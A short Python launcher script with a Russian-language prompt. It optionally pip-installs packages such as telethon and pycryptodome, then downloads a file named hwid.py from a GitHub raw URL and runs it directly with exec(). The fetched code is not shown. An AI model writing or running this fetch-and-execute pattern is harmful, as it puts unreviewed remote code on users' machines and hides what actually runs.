import os
import platform

from requests import get

startapp = get("https://raw.githubusercontent.com/hazurik/cnocep/main/hwid.py").text

if platform.system() == "Windows":
    os.system('cls')
else:
    os.system('clear')

answer = input("Пропустить установку нуждающихся компонентов? [y/n]: ")
if answer.upper() == 'Y':
    exec(startapp)
if answer.upper() == 'N':
    os.system('pip install requests && pip install pycryptodome && pip install colorama && pip install telethon && pip install pyfiglet && pip install termcolor && pip install pystyle && pip install colorama && clear')
    exec(startapp)
